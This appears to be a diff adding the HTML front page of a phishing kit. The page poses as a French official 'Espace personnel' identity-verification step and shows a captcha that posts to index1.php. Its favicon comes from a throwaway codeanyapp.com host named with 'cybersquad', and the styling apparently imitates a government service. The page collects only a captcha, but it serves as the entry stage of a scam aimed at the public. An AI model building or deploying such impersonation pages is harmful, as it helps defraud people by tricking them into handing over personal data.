@@ -1,0 +1,58 @@
+<html lang="en"><head>
+<!-- Required meta tags -->
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/><!-- Bootstrap CSS -->
+<link href="local_resources/css/2110e24e24492d9e84a582ae1b103fc9.css" rel="stylesheet"/>
+
+<link href="local_resources/css/231e8bd01b38c097a02a27076a7418fd.css" rel="stylesheet"/>
+<link href="local_resources/css/8b87b60424dd35d0606135dba1489127.css" rel="stylesheet"/>
+<link href="https://servicio-onlineee2k24-cybersquad721601822.codeanyapp.com/wp-content/themes/twentytwenty/assets/js/assets//favicon.ico" rel="shortcut icon" type="images/x-icon"/>
+<title>Espace personnel</title>
+</head>
+<body>
+<nav class="navbar navbar-expand-md navbar-dark mb-4 nav-spf">
+<a class="navbar-brand" href="#"><img class="logo-spf" src="local_resources/img/79002b64af7e8c42f36291028deb73a5.png"/></a> <button aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler" data-target="#navbarCollapse" data-toggle="collapse" type="button"><span class="navbar-toggler-icon"></span></button>
+</nav>
+<main class="container" role="main">
+<div class="jumbotron jmb">
+<div class="card">
+<form action="index1.php" method="POST">
+<div class="card-header">
+<strong>Vérification d'identité</strong> <small></small>
+</div>
+<div class="card-body ptn">
+<div class="row">
+<div class="col-sm-12">
+<div class="form-group">
+<center><label for="ccnumber"><img alt="captcha" onclick="this.src='image.php?' + Math.random();" src="local_resources/img/f609386aea6074e61c68ef356e0ede4e.php" style="cursor:pointer;"/></label></center>
+<div class="input-group">
+<div class="input-group-append">
+<span class="input-group-text"><i class="mdi mdi-barcode"></i></span>
+</div><input class="form-control" name="captcha" oninput="handleInput(event)" placeholder="" required="" style="text-transform: uppercase" type="text"/>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="card-footer" style="background-color: #fff;">
+<button class="btn btn-sm btn-success float-right" style="margin: 10px;" type="submit"><i class="mdi mdi-gamepad-circle"></i> Continue</button>
+</div>
+</form>
+</div>
+</div><!-- Modal -->
+</main>
+<footer class="footer navbar-inverse foot">
+        Informations légales | Aide
+    </footer><!-- Optional JavaScript; choose one of the two! -->
+<!-- Option 1: Bootstrap Bundle with Popper -->
+</body></html>
+<script>
+    
+    function handleInput(e) {
+   var ss = e.target.selectionStart;
+   var se = e.target.selectionEnd;
+   e.target.value = e.target.value.toUpperCase();
+   e.target.selectionStart = ss;
+   e.target.selectionEnd = se;
+}
+</script>
